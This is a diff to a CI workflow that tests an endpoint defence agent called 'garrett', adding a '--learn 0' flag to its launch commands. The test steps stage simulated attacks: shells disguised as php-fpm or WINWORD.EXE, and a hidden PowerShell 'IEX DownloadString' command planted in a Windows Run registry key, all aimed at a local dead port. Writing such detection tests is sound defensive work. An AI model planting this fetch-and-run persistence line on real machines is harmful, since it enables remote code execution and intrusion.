@@ -341,7 +341,7 @@ jobs:
           http.server.ThreadingHTTPServer(("127.0.0.1", 18081), H).serve_forever()
           EOF
           python3 service.py &
-          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gs-state run --mode kill > /tmp/agent.log 2>&1 &"
+          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gs-state run --mode kill --learn 0 > /tmp/agent.log 2>&1 &"
           sleep 12
           sent=0
           for delay in 0 0.01 0.03 0.07 0.2 1.0; do
@@ -446,7 +446,7 @@ jobs:
         run: cd rust && cargo build --release --locked
       - name: A download-and-run shell started by a web server is ended before it acts
         run: |
-          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gs run --mode kill > /tmp/agent.log 2>&1 &"
+          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gs run --mode kill --learn 0 > /tmp/agent.log 2>&1 &"
           mkdir -p /tmp/gi && cp /bin/bash /tmp/gi/php-fpm8.3
           sleep 14
           sent=0
@@ -489,7 +489,7 @@ jobs:
         run: |
           $ErrorActionPreference = 'Stop'
           $state = Join-Path $env:TEMP 'gs'; $work = Join-Path $env:TEMP 'gi'; New-Item -ItemType Directory -Force $work | Out-Null
-          $agent = Start-Process (Join-Path $env:GITHUB_WORKSPACE 'rust\target\release\garrett.exe') -ArgumentList '--state-dir', $state, 'run', '--mode', 'kill' -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $work 'agent.log') -RedirectStandardError (Join-Path $work 'agent.err')
+          $agent = Start-Process (Join-Path $env:GITHUB_WORKSPACE 'rust\target\release\garrett.exe') -ArgumentList '--state-dir', $state, 'run', '--mode', 'kill', '--learn', '0' -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $work 'agent.log') -RedirectStandardError (Join-Path $work 'agent.err')
           Start-Sleep -Seconds 12
           $word = Join-Path $work 'WINWORD.EXE'; Copy-Item (Join-Path $env:SystemRoot 'System32\cmd.exe') $word
           $sent = 0
@@ -553,7 +553,7 @@ jobs:
           $fetch = { param($tag) "powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/$tag')""" }
           # There before the agent starts: the starting point, not news.
           New-ItemProperty -Path $run -Name 'GwOld' -Value (& $fetch 'old') | Out-Null
-          $agent = Start-Process $garrett -ArgumentList '--state-dir', $state, 'run', '--mode', 'kill' -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $work 'agent.log') -RedirectStandardError (Join-Path $work 'agent.err')
+          $agent = Start-Process $garrett -ArgumentList '--state-dir', $state, 'run', '--mode', 'kill', '--learn', '0' -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $work 'agent.log') -RedirectStandardError (Join-Path $work 'agent.err')
           $began = Get-Date
           Start-Sleep -Seconds 15
           if ($agent.HasExited) { Get-Content (Join-Path $work 'agent.err'); throw 'the agent did not stay running' }
